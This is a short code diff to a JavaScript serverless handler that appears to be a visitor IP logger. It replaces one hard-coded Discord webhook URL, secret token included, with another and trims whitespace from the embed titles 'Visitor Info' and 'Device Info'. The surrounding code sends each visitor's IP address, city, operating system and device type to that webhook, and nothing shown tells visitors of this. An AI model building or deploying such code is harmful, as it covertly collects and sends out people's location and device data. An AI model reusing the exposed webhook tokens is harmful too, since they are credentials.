@@ -1,7 +1,7 @@
 import axios from 'axios';
 
 // ✅ Your new Discord webhook
-const WEBHOOK = "https://discord.com/api/webhooks/1385400268514136165/lRS6bUpHEFgMG1pwhDQFrIBIyU2Z9_oLCApcZbX5XOEJgaRYdYR5pjkm6O1o7oWmzn6t";
+const WEBHOOK = "https://discord.com/api/webhooks/1385789892784685239/rnPqSMCLTPZ-V8dfnXNJm8Mu3HHn5JNxSHcreT6VGDd_Uu7uZXCa9gtYzvA_yg411GEk";
 
 function detectOS(userAgent) {
   userAgent = userAgent.toLowerCase();
@@ -31,7 +31,7 @@ export default async function handler(req, res) {
     embeds: [
       {
         color: 0x2f3136,
-        title: ' Visitor Info',
+        title: 'Visitor Info',
         fields: [
           { name: 'IP', value: data.ip || 'Unknown' },
           { name: 'City', value: data.city || 'Unknown', inline: true },
@@ -45,7 +45,7 @@ export default async function handler(req, res) {
       },
       {
         color: 0x2f3136,
-        title: ' Device Info',
+        title: 'Device Info',
         fields: [
           { name: 'OS', value: data.os || 'Unknown', inline: true },
           { name: 'Mobile', value: String(data.mobile), inline: true },
